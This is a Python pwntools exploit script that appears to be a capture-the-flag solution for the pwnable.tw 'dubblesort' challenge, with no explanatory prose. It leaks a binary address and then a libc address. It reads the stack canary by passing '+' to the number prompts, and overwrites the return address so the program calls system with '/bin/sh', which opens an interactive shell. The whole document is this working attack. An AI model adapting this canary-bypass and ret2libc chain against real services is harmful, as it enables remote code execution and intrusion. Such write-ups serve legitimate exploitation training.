#!/usr/bin/python3
from pwn import *

PATH = "./dubblesort_patched"
HOST, PORT = "chall.pwnable.tw", 10101
SSL = False

exe = context.binary = ELF(PATH, checksec=False)
libc = ELF("libc_32.so.6", checksec=False)
context.terminal = ['tmux', 'splitw', '-h', '-p', '55']

info = lambda x, msg="Test": log.info(msg + ": " + hex(x)) or x
s = lambda data: sleep(0.1) or p.send(data)
sl = lambda data=b"": sleep(0.1) or p.sendline(data)
sa = lambda msg, data: p.sendafter(msg, data)
sla = lambda msg, data=b"": p.sendlineafter(msg, data)
sn = lambda num=0: sleep(0.1) or p.sendline(str(num).encode())
sna = lambda msg, num=0: p.sendlineafter(msg, str(num).encode())

gs = f'''

b*$_base()+0x00000AB3
c

#b*$_base()+0x00000A37
c
'''

def conn():
    if args.REMOTE:
        return remote(HOST, PORT, ssl=SSL)
    else: 
        return process(exe.path)
def GDB():
    if args.GDB:
        gdb.attach(p, gdbscript=gs)
    #sleep(1)

p = conn()
GDB()

#1
name = b"A"*(4*16)
sa(b"What your name :", name)
p.recvuntil(name)
exe_leak = info(u32(b'\0'+p.recv(3)), "exe_leak")
exe.address = info(exe_leak-0x601, "exe.address")

offset_canary = 24
offset_rip = 7
num = offset_canary + 1 + offset_rip
sna(b"How many numbers do you what to sort :", num + 2)

for i in range(offset_canary):
    sna(b"number : ", 0x100+i)
sla(b"number : ", b'+')
for i in range(offset_rip):
    sna(b"number : ", exe.sym.main)
sla(b"number : ", b'+')
sna(b"number : ", exe.sym.main)

p.recvuntil(b"Result :\n")
arr = p.recvuntil(b"What your name :").split()

canary = info(int(arr[24]), "canary")
libc_leak = info(int(arr[33]), "libc_leak")
libc.address = info(libc_leak-0x18637, "libc.address")

#2
s(name)
sna(b"How many numbers do you what to sort :", num)

for i in range(num - 3):
    sna(b"number : ", canary)
sna(b"number : ", libc.sym.system)
sna(b"number : ", next(libc.search(b"/bin/sh\0")))
sna(b"number : ", next(libc.search(b"/bin/sh\0")))


p.interactive()
